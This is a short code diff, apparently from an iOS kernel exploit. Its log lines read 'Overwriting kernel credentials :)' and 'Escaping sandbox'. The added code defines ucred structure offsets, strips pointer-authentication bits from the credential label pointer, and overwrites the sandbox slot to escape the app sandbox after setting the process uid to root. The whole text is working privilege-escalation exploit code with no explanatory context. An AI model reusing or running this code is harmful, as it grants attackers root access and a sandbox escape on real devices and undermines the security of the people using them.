@@ -388,13 +388,20 @@ stage1:
 
     cicuta_log("Overwriting kernel credentials :)");
     uint32_t creds[5] = {0, 0, 0, 1, 0};
+    uint32_t buffer[5] = {0, 0, 0, 1, 0};
     write_20(ucred + 0x18, (void*)creds);
-
+    static unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
+    static unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label
+    static unsigned off_sandbox_slot = 0x10;
     uint32_t uid = getuid();
     cicuta_log("getuid() returns %u", uid);
     cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
     cicuta_log("Check for escaping sandbox");
-
+    printf("Escaping sandbox.\n");
+    uint64_t cr_label_pac = read_64(ucred + off_ucred_cr_label);
+    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    printf("PAC decrypt: 0x%llx -> 0x%llx\n", cr_label_pac, cr_label);
+    write_20(cr_label + off_sandbox_slot, (void*)buffer);
 err:
     //free(redeem_racers);
     cicuta_log("Out.");
